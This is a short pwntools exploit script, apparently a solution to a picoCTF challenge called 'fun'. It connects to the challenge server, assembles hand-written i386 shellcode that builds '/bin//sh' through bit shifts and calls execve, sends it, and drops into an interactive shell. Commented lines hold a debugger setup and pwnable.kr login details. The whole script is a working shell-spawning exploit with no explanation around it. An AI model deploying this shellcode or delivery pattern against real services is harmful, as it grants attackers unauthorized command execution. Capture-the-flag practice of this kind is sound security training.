#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./fun", checksec = False)

#con = process()
"""
gdb.attach(con, gdbscript = '''
	b*0x80485c9
	c
	''')
"""
#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("mercury.picoctf.net", 35338)

shellcode = asm(
	'''
	xor eax, eax
	mov al, 0xb
	xor ecx, ecx
	xor edx, edx
	xor ebx, ebx
	mov bh, 0x68
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	mov bh, 0x73
	mov bl, 0x2f
	push ebx
	nop
	xor ebx, ebx
	mov bh, 0x6e
	mov bl, 0x69
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	shl ebx
	mov bh, 0x62
	mov bl, 0x2f
	push ebx
	nop
	mov ebx, esp
	int 0x80
	''', arch = 'i386')

#print(shellcode)

input()
con.sendline(shellcode)

con.interactive()
